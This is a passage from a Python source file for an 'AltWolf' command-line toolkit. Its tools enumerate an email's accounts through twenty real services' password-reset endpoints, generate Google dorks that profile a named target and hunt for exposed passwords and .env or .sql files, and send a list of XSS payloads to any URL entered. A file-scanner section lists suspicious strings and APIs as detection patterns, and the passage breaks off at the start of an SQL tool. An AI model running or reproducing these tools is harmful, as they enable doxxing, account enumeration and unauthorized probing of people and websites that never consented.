        "   .+++++++==+++++++++++++++++-+++++++:   \n"
        "   .+++++++= .:++++++++++++-. -+++++++:   \n"
        "   .+++++++=    .-+++++++..   -+++++++:   \n"
        "   .+++++++=       .=+:.      -+++++++:   \n"
        "   .+++++++=                  -+++++++:   \n"
        "   .+++++++=                  -+++++++:   \n"
        f"   .+++++++=                  -+++++++.{r0}\n"
    )
 
    print(typn)
    def check_email_exists(email):
        sites = {
            "Facebook": "https://www.facebook.com/recover/initiate",
            "Twitter": "https://twitter.com/account/begin_password_reset",
            "Instagram": "https://www.instagram.com/accounts/password/reset/",
            "Snapchat": "https://accounts.snapchat.com/accounts/password/reset",
            "Pinterest": "https://www.pinterest.com/reset/",
            "TikTok": "https://www.tiktok.com/login/forgot-password",
            "Reddit": "https://www.reddit.com/password",
            "Tumblr": "https://www.tumblr.com/login/forgot",
            "YouTube": "https://www.youtube.com/account_recovery",
            "GitHub": "https://github.com/password_reset",
            "LinkedIn": "https://www.linkedin.com/uas/request-password-reset",
            "Discord": "https://discord.com/api/v9/auth/forgot",
            "Spotify": "https://accounts.spotify.com/en/password-reset",
            "Netflix": "https://www.netflix.com/password",
            "Amazon": "https://www.amazon.com/ap/forgotpassword",
            "Microsoft": "https://account.live.com/password/reset",
            "Apple": "https://iforgot.apple.com/password/verify/appleid",
            "Dropbox": "https://www.dropbox.com/forgot",
            "Twitch": "https://www.twitch.tv/user/password_reset",
            "Steam": "https://store.steampowered.com/login/forgotpassword"
        }

        results = {}
        print(f"Checking email: {email}")
        print("This may take a moment...\n")

        for site_name, reset_url in sites.items():
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                payload = {'email': email}
                response = requests.post(reset_url, data=payload, timeout=5, headers=headers, allow_redirects=True)

                response_text = response.text.lower()
                        
                if any(keyword in response_text for keyword in ['sent', 'email', 'recovery', 'reset', 'check your email', 'verify']):
                    results[site_name] = "Account found"
                    print(f"[+] {site_name}: Account found")
                else:
                    results[site_name] = "Not found"

            except requests.RequestException:
                results[site_name] = "Could not check"
            except:
                pass

        return results

    email_to_check = input("Enter email address to check: ")
    results = check_email_exists(email_to_check)

    print("\n" + "="*50)
    print("Results:\n")
    for site, result in results.items():
        if result == "Account found":
            print(f"    {site}: {result}")

    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_10_image_search():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    banner = (
        f"\n{v}"
        "           :----------.                           \n"
        "       .=-=---:.  .:-----:                        \n"
        "     --==:              :=--                      \n"
        "   .-==.                  .=-:                    \n"
        "  .-=-                      -=-                   \n"
        " .-=-                        :=:                  \n"
        " --=                         .--.                 \n"
        ".-=-                          :=:                 \n"
        f".-=:                          :=-               {b0}Image Search by AltWolf{r0}{v}\n"
        ".-=:                          :=:                      Free Version\n"
        " --=                          --.                 \n"
        " --=:                        :=-                  \n"
        "  --=:                      :=-                   \n"
        "   -===                    -=-.                   \n"
        "    .-==-               .-=-==                    \n"
        "      .--==-:.      .:-==--=#*=:-                 \n"
        "         .---========--:.   .-=***-               \n"
        "              ..:...         -*###**-             \n"
        "                               +####**-           \n"
        "                                :*####*+=         \n"
        "                                  =######+-       \n"
        "                                    +######*-     \n"
        "                                      *#####*:    \n"
        "                                       :*####=    \n"
        f"                                          .:-.{r0}\n"
    )

    print(banner)

    def search_by_url(url):
        encoded = urllib.parse.quote(url, safe="")

        links = {
            "Google Lens":       f"https://lens.google.com/uploadbyurl?url={encoded}",
            "TinEye":            f"https://www.tineye.com/search?url={encoded}",
            "Yandex Images":     f"https://yandex.com/images/search?url={encoded}&rpt=imageview",
            "Bing Visual":       f"https://www.bing.com/images/search?q=imgurl:{encoded}&view=detailv2&iss=sbi",
            "Baidu Images":      f"https://image.baidu.com/n/pc_search?queryImageUrl={encoded}",
            "SauceNAO":          f"https://saucenao.com/search.php?url={encoded}",
            "IQDB":              f"https://iqdb.org/?url={encoded}",
            "Karma Decay":       f"https://karmadecay.com/search?q={encoded}",
            "PimEyes":           f"https://pimeyes.com/en",
            "Diffbot":           f"https://www.diffbot.com/dev/demo/?url={encoded}",
        }

        print(f"  URL : {url}\n")
        print("  ── REVERSE IMAGE SEARCH ────────────────────────\n")
        for name, link in links.items():
            print(f"  {name:<20} {link}")
        print()

    def search_by_keywords(keywords):
        encoded = urllib.parse.quote(keywords)

        links = {
            "Google Images":     f"https://www.google.com/search?tbm=isch&q={encoded}",
            "Yandex Images":     f"https://yandex.com/images/search?text={encoded}",
            "Bing Images":       f"https://www.bing.com/images/search?q={encoded}",
            "DuckDuckGo":        f"https://duckduckgo.com/?q={encoded}&iax=images&ia=images",
            "Flickr":            f"https://www.flickr.com/search/?text={encoded}",
            "Pinterest":         f"https://www.pinterest.com/search/pins/?q={encoded}",
            "500px":             f"https://500px.com/search?q={encoded}&type=photos",
            "Unsplash":          f"https://unsplash.com/s/photos/{encoded}",
            "Imgur":             f"https://imgur.com/search?q={encoded}",
            "Reddit Images":     f"https://www.reddit.com/search/?q={encoded}&type=image",
        }

        print(f"  Keywords : {keywords}\n")
        print("  ── IMAGE SEARCH BY KEYWORDS ────────────────────\n")
        for name, link in links.items():
            print(f"  {name:<20} {link}")
        print()

    print("  [1] Reverse search by image URL")
    print("  [2] Search by keywords")
    print()
    choice = input("  > ").strip()

    if choice == "1":
        print()
        url = input("  Image URL: ").strip()
        if not url:
            print("\n  No input provided.")
        else:
            print()
            search_by_url(url)

    elif choice == "2":
        print()
        keywords = input("  Keywords: ").strip()
        if not keywords:
            print("\n  No input provided.")
        else:
            print()
            search_by_keywords(keywords)

    else:
        print("\n  Invalid option.")

    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_11_domain_history():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    try:
        import pefile
        PEFILE_AVAILABLE = True
    except ImportError:
        PEFILE_AVAILABLE = False

    try:
        import magic
        MAGIC_AVAILABLE = True
    except ImportError:
        MAGIC_AVAILABLE = False

    banner = (
        f"\n{v}"
        "           :----------.                           \n"
        "       .=-=---:.  .:-----:                        \n"
        "     --==:              :=--                      \n"
        "   .-==.                  .=-:                    \n"
        "  .-=-                      -=-                   \n"
        " .-=-                        :=:                  \n"
        " --=                         .--.                 \n"
        ".-=-                          :=:                 \n"
        f".-=:                          :=-               {b0}File Scanner by AltWolf{r0}{v}\n"
        ".-=:                          :=:                      Free Version\n"
        " --=                          --.                 \n"
        " --=:                        :=-                  \n"
        "  --=:                      :=-                   \n"
        "   -===                    -=-.                   \n"
        "    .-==-               .-=-==                    \n"
        "      .--==-:.      .:-==--=#*=:-                 \n"
        "         .---========--:.   .-=***-               \n"
        "              ..:...         -*###**-             \n"
        "                               +####**-           \n"
        "                                :*####*+=         \n"
        "                                  =######+-       \n"
        "                                    +######*-     \n"
        "                                      *#####*:    \n"
        "                                       :*####=    \n"
        f"                                          .:-.{r0}\n"
    )

    print(banner)

    class AntivirusScanner:
        def __init__(self):
            self.suspicious_strings = [
                b'cmd.exe', b'powershell', b'rundll32', b'regsvr32',
                b'WScript.Shell', b'Shell.Application', b'HKEY_',
                b'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                b'CreateRemoteThread', b'VirtualAllocEx', b'WriteProcessMemory',
                b'ShellExecute', b'URLDownloadToFile', b'WinExec',
                b'system(', b'exec(', b'eval(', b'base64',
                b'encrypt', b'decrypt', b'ransom', b'bitcoin',
                b'keylog', b'password', b'credentials'
            ]

            self.dangerous_apis = [
                'CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory',
                'SetWindowsHookEx', 'GetAsyncKeyState', 'VirtualProtect',
                'LoadLibrary', 'GetProcAddress', 'URLDownloadToFile',
                'WinHttpOpen', 'InternetOpen', 'CreateProcess'
            ]

            self.known_malware_hashes = {
                'd41d8cd98f00b204e9800998ecf8427e': 'Suspicious empty file',
                '5d41402abc4b2a76b9719d911017c592': 'Test malware signature',
            }

            self.report = {
                'file_path': '',
                'scan_time': '',
                'file_size': 0,
                'file_type': '',
                'md5': '',
                'sha256': '',
                'threats_found': [],
                'suspicious_indicators': [],
                'risk_level': 'SAFE'
            }

        def calculate_hashes(self, filepath):
            try:
                md5 = hashlib.md5()
                sha256 = hashlib.sha256()
                with open(filepath, 'rb') as f:
                    while chunk := f.read(8192):
                        md5.update(chunk)
                        sha256.update(chunk)
                return md5.hexdigest(), sha256.hexdigest()
            except Exception as e:
                print(f"  Error calculating hashes: {str(e)}")
                return None, None

        def check_hash_database(self, md5_hash):
            if md5_hash and md5_hash in self.known_malware_hashes:
                return True, self.known_malware_hashes[md5_hash]
            return False, None

        def scan_strings(self, filepath):
            threats = []
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                    for suspicious in self.suspicious_strings:
                        if suspicious in content:
                            threats.append(f"Suspicious string: {suspicious.decode('utf-8', errors='ignore')}")
            except Exception as e:
                threats.append(f"Error scanning strings: {str(e)}")
            return threats

        def analyze_pe_file(self, filepath):
            if not PEFILE_AVAILABLE:
                return ["pefile module not available - PE analysis skipped"]
            threats = []
            try:
                pe = pefile.PE(filepath)
                for section in pe.sections:
                    section_name = section.Name.decode('utf-8', errors='ignore').strip('\x00')
                    if not section_name.startswith(('.text', '.data', '.rdata', '.rsrc', '.reloc', '.idata')):
                        threats.append(f"Suspicious section: {section_name}")
                    entropy = section.get_entropy()
                    if entropy > 7.0:
                        threats.append(f"High entropy in {section_name}: {entropy:.2f} (possibly packed)")
                if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
                    for entry in pe.DIRECTORY_ENTRY_IMPORT:
                        dll_name = entry.dll.decode('utf-8', errors='ignore')
                        for imp in entry.imports:
                            if imp.name:
                                func_name = imp.name.decode('utf-8', errors='ignore')
                                if func_name in self.dangerous_apis:
                                    threats.append(f"Dangerous API: {func_name} from {dll_name}")
                try:
                    security = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']]
                    if security.Size == 0:
                        self.report['suspicious_indicators'].append("File not digitally signed")
                except:
                    pass
            except pefile.PEFormatError:
                return ["File is not a valid PE executable"]
            except Exception as e:
                return [f"Error analyzing PE: {str(e)}"]
            return threats

        def check_file_anomalies(self, filepath):
            anomalies = []
            try:
                file_size = os.path.getsize(filepath)
                if file_size < 1024:
                    anomalies.append("File abnormally small for an executable")
                elif file_size > 50 * 1024 * 1024:
                    anomalies.append("Very large file (potentially suspicious)")
                if MAGIC_AVAILABLE:
                    try:
                        mime = magic.Magic(mime=True)
                        file_type = mime.from_file(filepath)
                        extension = Path(filepath).suffix.lower()
                        if extension == '.exe' and 'executable' not in file_type.lower():
                            anomalies.append(f"Extension .exe but MIME type: {file_type}")
                    except Exception:
                        pass
            except Exception as e:
                anomalies.append(f"Error checking anomalies: {str(e)}")
            return anomalies

        def calculate_risk_level(self):
            threat_count = len(self.report['threats_found'])
            suspicious_count = len(self.report['suspicious_indicators'])
            if threat_count >= 5:
                return 'CRITICAL'
            elif threat_count >= 3 or suspicious_count >= 5:
                return 'HIGH'
            elif threat_count >= 1 or suspicious_count >= 3:
                return 'MEDIUM'
            elif suspicious_count >= 1:
                return 'LOW'
            else:
                return 'SAFE'

        def scan_file(self, filepath):
            if not os.path.exists(filepath):
                print(f"  Error: File '{filepath}' does not exist!")
                return False
            if not os.path.isfile(filepath):
                print(f"  Error: '{filepath}' is not a file!")
                return False

            self.report = {
                'file_path': filepath,
                'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'file_size': 0,
                'file_type': '',
                'md5': '',
                'sha256': '',
                'threats_found': [],
                'suspicious_indicators': [],
                'risk_level': 'SAFE'
            }

            try:
                self.report['file_size'] = os.path.getsize(filepath)
            except Exception as e:
                print(f"  Error reading file size: {str(e)}")
                return False

            if MAGIC_AVAILABLE:
                try:
                    mime = magic.Magic(mime=True)
                    self.report['file_type'] = mime.from_file(filepath)
                except:
                    self.report['file_type'] = 'Unknown'
            else:
                ext = Path(filepath).suffix.lower()
                type_mapping = {
                    '.exe': 'application/x-executable',
                    '.dll': 'application/x-msdownload',
                    '.txt': 'text/plain',
                    '.pdf': 'application/pdf',
                    '.zip': 'application/zip',
                }
                self.report['file_type'] = type_mapping.get(ext, 'Unknown')

            print(f"  File : {filepath}")
            print(f"  Size : {self.report['file_size']:,} bytes")
            print(f"  Type : {self.report['file_type']}")
            print()

            print("  Calculating hashes...")
            md5_hash, sha256_hash = self.calculate_hashes(filepath)
            if md5_hash and sha256_hash:
                self.report['md5'] = md5_hash
                self.report['sha256'] = sha256_hash
                print(f"  MD5    : {md5_hash}")
                print(f"  SHA256 : {sha256_hash}")
            else:
                print("  Unable to calculate hashes")
                return False

            print()
            print("  Checking known malware database...")
            is_known, malware_name = self.check_hash_database(md5_hash)
            if is_known:
                self.report['threats_found'].append(f"KNOWN MALWARE: {malware_name}")
                print(f"  [!] MALWARE DETECTED: {malware_name}")
            else:
                print("  [+] Hash not found in malware database")

            print()
            print("  Analyzing strings...")
            string_threats = self.scan_strings(filepath)
            self.report['threats_found'].extend(string_threats)
            if string_threats:
                print(f"  [!] {len(string_threats)} suspicious string(s) detected")
            else:
                print("  [+] No suspicious strings found")

            if filepath.lower().endswith(('.exe', '.dll', '.sys')):
                print()
                print("  Analyzing PE structure...")
                pe_threats = self.analyze_pe_file(filepath)
                self.report['threats_found'].extend(pe_threats)
                if pe_threats:
                    print(f"  [!] {len(pe_threats)} threat(s) detected in PE structure")
                else:
                    print("  [+] Normal PE structure")

            print()
            print("  Detecting anomalies...")
            anomalies = self.check_file_anomalies(filepath)
            self.report['suspicious_indicators'].extend(anomalies)
            if anomalies:
                print(f"  [!] {len(anomalies)} anomaly(ies) detected")
            else:
                print("  [+] No anomalies detected")

            self.report['risk_level'] = self.calculate_risk_level()
            self.display_report()
            return True

        def display_report(self):
            print()
            print("  ── SCAN REPORT ─────────────────────────────────")
            print(f"  RISK LEVEL : {self.report['risk_level']}")
            print(f"  Threats    : {len(self.report['threats_found'])}")
            print(f"  Indicators : {len(self.report['suspicious_indicators'])}")

            if self.report['threats_found']:
                print()
                print("  THREATS DETECTED:")
                for i, threat in enumerate(self.report['threats_found'], 1):
                    print(f"    {i}. {threat}")

            if self.report['suspicious_indicators']:
                print()
                print("  SUSPICIOUS INDICATORS:")
                for i, indicator in enumerate(self.report['suspicious_indicators'], 1):
                    print(f"    {i}. {indicator}")

            print()
            if self.report['risk_level'] == 'SAFE':
                print("  File appears to be safe.")
            else:
                print("  WARNING: File shows suspicious characteristics!")
                print("  Recommendation: Do not execute without thorough verification.")
            print()

        def save_report(self):
            try:
                report_file = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(report_file, 'w', encoding='utf-8') as f:
                    json.dump(self.report, f, indent=4, ensure_ascii=False)
                print(f"  Report saved: {report_file}")
                return True
            except Exception as e:
                print(f"  Error saving report: {str(e)}")
                return False

    scanner = AntivirusScanner()

    while True:
        filepath = input("  Enter file path to scan (or 'q' to quit): ").strip()

        if filepath.lower() in ['q', 'quit', 'exit']:
            break

        filepath = filepath.strip('"').strip("'")

        if not filepath:
            continue

        success = scanner.scan_file(filepath)

        if success:
            save = input("  Save report as JSON? (y/n): ").strip().lower()
            if save in ['y', 'yes']:
                scanner.save_report()

        again = input("  Scan another file? (y/n): ").strip().lower()
        if again not in ['y', 'yes']:
            break





    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_12_google_dork():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()

    banner = (
        f"\n{v}"
        "              .:::..            \n"
        "         -=============-        \n"
        "       =================-       \n"
        "     -======-       -==         \n"
        "    :=====.                     \n"
        "   ....-=                       \n"
        f"   .....         :::::::::::::       {b0}Google-Dork by AltWolf{r0}{v}\n"
        "   ......         :::::::::::::            Version V1.1.1\n"
        "  ......         :::::::::::::  \n"
        "   .....         :::::::::::::  \n"
        "   .....:               ::::::  \n"
        "    .:---:             .:::::   \n"
        "     ------:         .::::::    \n"
        "      :----------------::::     \n"
        "        :---------------:       \n"
        f"           .::------:.{r0}\n"
    )

    print(banner)

    class OSINTDorkGenerator:
        def __init__(self):
            self.target_info = {}
            self.generated_dorks = []

        def get_target_info(self):
            sys.stdout.write(clrscr())
            print(banner)
            print("  ENTER TARGET INFORMATION")
            print("  (Press Enter to skip any field)\n")

            fields = {
                'first_name': 'First Name',
                'last_name': 'Last Name',
                'full_name': 'Full Name',
                'username': 'Username/Nickname',
                'email': 'Email Address',
                'phone': 'Phone Number',
                'domain': 'Domain/Website',
                'company': 'Company/Organization',
                'job_title': 'Job Title',
                'city': 'City',
                'state': 'State/Region',
                'country': 'Country',
                'keyword': 'Additional Keywords (comma-separated)'
            }

            self.target_info = {}
            for key, label in fields.items():
                value = input(f"  {label}: ").strip()
                if value:
                    self.target_info[key] = value

            if not self.target_info:
                print("\n  [!] No information entered.")
                input("\n  Press Enter to continue...")
                return False

            print(f"\n  [+] {len(self.target_info)} field(s) collected.")
            input("\n  Press Enter to continue...")
            return True

        def generate_dorks(self):
            if not self.target_info:
                print("\n  [!] No target information. Please enter data first.")
                input("\n  Press Enter to continue...")
                return

            self.generated_dorks = []

            first_name = self.target_info.get('first_name', '')
            last_name  = self.target_info.get('last_name', '')
            full_name  = self.target_info.get('full_name', '')
            username   = self.target_info.get('username', '')
            email      = self.target_info.get('email', '')
            phone      = self.target_info.get('phone', '')
            domain     = self.target_info.get('domain', '')
            company    = self.target_info.get('company', '')
            job_title  = self.target_info.get('job_title', '')
            city       = self.target_info.get('city', '')
            state      = self.target_info.get('state', '')
            country    = self.target_info.get('country', '')
            keywords   = self.target_info.get('keyword', '').split(',')

            names = []
            if full_name:
                names.append(full_name)
            if first_name and last_name:
                names.append(f"{first_name} {last_name}")
                names.append(f"{last_name} {first_name}")
            elif first_name:
                names.append(first_name)
            elif last_name:
                names.append(last_name)

            self.generated_dorks.append("# === BASIC INFORMATION SEARCHES ===")
            for name in names:
                self.generated_dorks.append(f'"{name}"')
                if company:
                    self.generated_dorks.append(f'"{name}" "{company}"')
                if city:
                    self.generated_dorks.append(f'"{name}" "{city}"')
            if username:
                self.generated_dorks.append(f'"{username}"')
            if email:
                self.generated_dorks.append(f'"{email}"')
                self.generated_dorks.append(f'"{email}" -site:linkedin.com')
            if phone:
                clean_phone = phone.replace('-','').replace('(','').replace(')','').replace(' ','')
                self.generated_dorks.append(f'"{phone}"')
                self.generated_dorks.append(f'"{clean_phone}"')

            self.generated_dorks.append("\n# === SOCIAL MEDIA PROFILES ===")
            social_sites = [
                'linkedin.com','facebook.com','twitter.com','instagram.com',
                'github.com','reddit.com','youtube.com','tiktok.com',
                'pinterest.com','snapchat.com','medium.com','behance.net',
                'dribbble.com','stackoverflow.com','quora.com'
            ]
            for name in names:
                for site in social_sites:
                    self.generated_dorks.append(f'site:{site} "{name}"')
            if username:
                for site in social_sites:
                    self.generated_dorks.append(f'site:{site} "{username}"')

            self.generated_dorks.append("\n# === DOCUMENT SEARCHES ===")
            doc_types = ['pdf','doc','docx','xls','xlsx','ppt','pptx','txt','csv']
            for name in names:
                for doc_type in doc_types:
                    self.generated_dorks.append(f'"{name}" filetype:{doc_type}')
            if email:
                for doc_type in doc_types:
                    self.generated_dorks.append(f'"{email}" filetype:{doc_type}')
            if company:
                for doc_type in doc_types:
                    self.generated_dorks.append(f'"{company}" filetype:{doc_type}')

            if domain:
                self.generated_dorks.append("\n# === DOMAIN-SPECIFIC SEARCHES ===")
                self.generated_dorks.append(f'site:{domain}')
                for name in names:
                    self.generated_dorks.append(f'site:{domain} "{name}"')
                if email:
                    self.generated_dorks.append(f'site:{domain} "{email}"')
                self.generated_dorks.append(f'site:*.{domain}')
                for doc_type in doc_types:
                    self.generated_dorks.append(f'site:{domain} filetype:{doc_type}')
                self.generated_dorks.append(f'site:{domain} intitle:"index of"')

            if email:
                self.generated_dorks.append("\n# === EMAIL-BASED SEARCHES ===")
                email_domain = email.split('@')[1] if '@' in email else ''
                if email_domain:
                    self.generated_dorks.append(f'"{email}" -site:{email_domain}')
                    self.generated_dorks.append(f'site:{email_domain} "{email}"')
                self.generated_dorks.append(f'"{email}" "breach" OR "leak" OR "dump"')
                self.generated_dorks.append(f'"{email}" intext:"password"')

            self.generated_dorks.append("\n# === PROFESSIONAL INFORMATION ===")
            if company:
                self.generated_dorks.append(f'"{company}" employees')
                self.generated_dorks.append(f'site:linkedin.com "{company}"')
                for name in names:
                    self.generated_dorks.append(f'"{name}" "{company}" site:linkedin.com')
            if job_title:
                for name in names:
                    self.generated_dorks.append(f'"{name}" "{job_title}"')
                if company:
                    self.generated_dorks.append(f'"{job_title}" "{company}"')
            for name in names:
                self.generated_dorks.append(f'"{name}" (resume OR cv) filetype:pdf')

            self.generated_dorks.append("\n# === LOCATION-BASED SEARCHES ===")
            location_parts = []
            if city:
                location_parts.append(city)
            if state:
                location_parts.append(state)
            if country:
                location_parts.append(country)
            if location_parts:
                location_str = ' '.join(location_parts)
                for name in names:
                    self.generated_dorks.append(f'"{name}" "{location_str}"')
                if company:
                    self.generated_dorks.append(f'"{company}" "{location_str}"')

            if username:
                self.generated_dorks.append("\n# === USERNAME SEARCHES ===")
                self.generated_dorks.append(f'"{username}" profile')
                self.generated_dorks.append(f'"{username}" account')
                self.generated_dorks.append(f'"{username}" user')
                self.generated_dorks.append(f'inurl:{username}')

            self.generated_dorks.append("\n# === CACHE & ARCHIVE SEARCHES ===")
            for name in names:
                self.generated_dorks.append(f'cache:"{name}"')
            if domain:
                self.generated_dorks.append(f'cache:{domain}')
                self.generated_dorks.append(f'site:web.archive.org "{domain}"')

            if phone:
                self.generated_dorks.append("\n# === PHONE NUMBER SEARCHES ===")
                clean_phone = phone.replace('-','').replace('(','').replace(')','').replace(' ','')
                self.generated_dorks.append(f'"{phone}" OR "{clean_phone}"')
                self.generated_dorks.append(f'"{phone}" (contact OR phone OR mobile OR cell)')

            self.generated_dorks.append("\n# === NEWS & ARTICLES ===")
            for name in names:
                self.generated_dorks.append(f'"{name}" site:news.google.com')
                self.generated_dorks.append(f'"{name}" (news OR article OR press)')

            self.generated_dorks.append("\n# === IMAGE SEARCHES ===")
            for name in names:
                self.generated_dorks.append(f'"{name}" filetype:jpg OR filetype:png')

            if keywords and keywords[0]:
                self.generated_dorks.append("\n# === KEYWORD-BASED SEARCHES ===")
                for keyword in keywords:
                    keyword = keyword.strip()
                    if keyword:
                        for name in names:
                            self.generated_dorks.append(f'"{name}" "{keyword}"')

            self.generated_dorks.append("\n# === POTENTIAL EXPOSURES ===")
            if email:
                self.generated_dorks.append(f'"{email}" (api OR key OR token OR credential)')
            if domain:
                self.generated_dorks.append(f'site:{domain} (password OR passwd OR pwd)')
                self.generated_dorks.append(f'site:{domain} filetype:log')
                self.generated_dorks.append(f'site:{domain} filetype:sql')
                self.generated_dorks.append(f'site:{domain} filetype:env')

            count = len([d for d in self.generated_dorks if not d.startswith('#')])
            print(f"\n  [+] {count} dorks generated successfully.")
            input("\n  Press Enter to continue...")

        def view_dorks(self):
            if not self.generated_dorks:
                print("\n  [!] No dorks generated yet.")
                input("\n  Press Enter to continue...")
                return

            sys.stdout.write(clrscr())
            print(banner)
            print("  GENERATED GOOGLE DORKS\n")

            i = 1
            for dork in self.generated_dorks:
                if dork.startswith('#'):
                    print(f"\n  {dork}")
                else:
                    print(f"  {i}. {dork}")
                    i += 1

            count = len([d for d in self.generated_dorks if not d.startswith('#')])
            print(f"\n  Total: {count} dorks")
            input("\n  Press Enter to continue...")

        def export_dorks(self):
            if not self.generated_dorks:
                print("\n  [!] No dorks to export.")
                input("\n  Press Enter to continue...")
                return

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"osint_dorks_{timestamp}.txt"

            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("OSINT GOOGLE DORKS\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    f.write("TARGET INFORMATION:\n")
                    for key, value in self.target_info.items():
                        f.write(f"{key.replace('_', ' ').title()}: {value}\n")
                    f.write("\nGENERATED DORKS:\n\n")
                    for dork in self.generated_dorks:
                        f.write(dork + "\n")

                print(f"\n  [+] Exported to: {filename}")
                print(f"  [+] Path: {os.path.abspath(filename)}")
            except Exception as e:
                print(f"\n  [!] Error: {str(e)}")

            input("\n  Press Enter to continue...")

        def clear_data(self):
            confirm = input("\n  Clear all data? (yes/no): ").strip().lower()
            if confirm == 'yes':
                self.target_info = {}
                self.generated_dorks = []
                print("\n  [+] Data cleared.")
            else:
                print("\n  [-] Cancelled.")
            input("\n  Press Enter to continue...")

        def run(self):
            while True:
                sys.stdout.write(clrscr())
                print(banner)

                if self.target_info:
                    print(f"  [Status] Target info: {len(self.target_info)} field(s)")
                if self.generated_dorks:
                    count = len([d for d in self.generated_dorks if not d.startswith('#')])
                    print(f"  [Status] Dorks: {count}")

                print()
                print("  1. Enter Target Information")
                print("  2. Generate Google Dorks")
                print("  3. View Generated Dorks")
                print("  4. Export Dorks to File")
                print("  5. Clear All Data")
                print("  6. Exit")
                print()

                choice = input("  > ").strip()

                if choice == '1':
                    self.get_target_info()
                elif choice == '2':
                    self.generate_dorks()
                elif choice == '3':
                    self.view_dorks()
                elif choice == '4':
                    self.export_dorks()
                elif choice == '5':
                    self.clear_data()
                elif choice == '6':
                    break
                else:
                    print("\n  [!] Invalid choice.")
                    input("  Press Enter to continue...")

    generator = OSINTDorkGenerator()
    generator.run()

    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_13_xss_search():
    show_cur()
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    sys.stdout.write(clrscr())

    xss = (
        f"\n{v}"
        "              %%%%*               \n"
        "            -%%%%%%%+             \n"
        "         :==*%#%%%%#*++=          \n"
        "            :%*#@#*=.             \n"
        "            :%##@=-=.             \n"
        "              %#=---.             \n"
        "           ===++++-               \n"
        "           ++++++**+:             \n"
        "           =++++++++++            \n"
        "         -++****+++**+            \n"
        "         =*+****+++*+-            \n"
        "         =******+++*-             \n"
        "         =*++***+++*-             \n"
        f"           +++**+++**=                        {b0}XSS Search By AltWolf{r0}{v}\n"
        "            :***+++***                              Version Free\n"
        "            :%%%#@@#-             \n"
        "           ****++**+*+            \n"
        "           ***+++##**+            \n"
        "         =**+=++*###*+            \n"
        "         +**+++*%%%%#*            \n"
        "      :=*++++*#+:*%%#*            \n"
        "      #**+++++   =%%#=            \n"
        "      #*****#*   =%%+             \n"
        "         +%%:    =%%%#            \n"
        "         +%%:      *%*            \n"
        "       .####.      *%*            \n"
        "       .##*=       *%*            \n"
        "       .##=        *%*            \n"
        "       .##=        *%*            \n"
        f"       :%%#+       *%%*=          {r0}\n"
    )
    print(xss)

    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"'><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<div onmouseover=alert(1)>Hover Me</div>",
        "<input type=text value=\"\"><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        "\";alert(1)//",
        "<img src=x onerror=prompt(1)>",
        "<svg onload=confirm(1)>",
        "javascript:alert(1)",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<style>@import'javascript:alert(1)';</style>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<base href=javascript:alert(1)//>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">"
    ]

    def test_xss_vulnerability(url, method="GET"):
        vulnerable_count = 0
        safe_count = 0

        for payload in xss_payloads:
            try:
                if method == "GET":
                    test_url = f"{url}?test={payload}"
                    response = requests.get(test_url, timeout=10)
                else:
                    response = requests.post(url, data={"test": payload}, timeout=10)

                if payload in response.text:
                    print(f"[!] Potentially vulnerable with payload: {payload}")
                    vulnerable_count += 1
                else:
                    safe_count += 1

            except requests.exceptions.RequestException as e:
                print(f"[X] Error with payload: {e}")

        return vulnerable_count, safe_count

    def check_get_and_post_xss(url):
        print(f"\nTesting GET parameters for {url}...")
        get_vuln, get_safe = test_xss_vulnerability(url, "GET")

        print(f"\nTesting POST parameters for {url}...")
        post_vuln, post_safe = test_xss_vulnerability(url, "POST")

        total_vuln = get_vuln + post_vuln
        total_safe = get_safe + post_safe

        print("\n" + "="*60)
        print(f"SCAN RESULTS FOR: {url}")
        print("="*60)
        print(f"Total vulnerable payloads: {total_vuln}")
        print(f"Total safe payloads: {total_safe}")
        print("="*60 + "\n")

    target_url = input("Enter website URL to test for XSS vulnerability: ").strip()

    if not target_url.startswith("http"):
        target_url = "https://" + target_url

    check_get_and_post_xss(target_url)

    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_14_sql_search():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    sql = (
            f"\n{v}"
            "                 ............                \n"
            "          ..:--------------------::.         \n"
            "       .:----:..              ..:-----.      \n"
            "      :--:.                        .:--:.    \n"
            "     .--.                             --.    \n"
            "     .---.                          .:--:    \n"
            "     .------..                  ..:-----:    \n"
            "     .--..::---------::::----------:..--:    \n"
            "     .--.     ...:::::::::::::..      --:    \n"
            "     .--.                             --:    \n"
